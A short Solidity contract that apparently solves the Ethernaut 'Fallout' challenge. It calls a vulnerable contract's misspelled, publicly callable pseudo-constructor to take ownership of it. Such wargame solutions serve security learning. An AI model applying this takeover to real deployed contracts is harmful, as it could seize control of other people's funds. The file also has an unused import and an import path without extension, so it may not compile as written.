// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./Fallout";

contract FalloutAttack {
    Fallout fallout;

    address payable public owner;

    constructor(address _fallout) {
        fallout = Fallout(_fallout);
        owner = payable(msg.sender);
    }

    function attack() public {
        fallout.Fal1out();
    }
}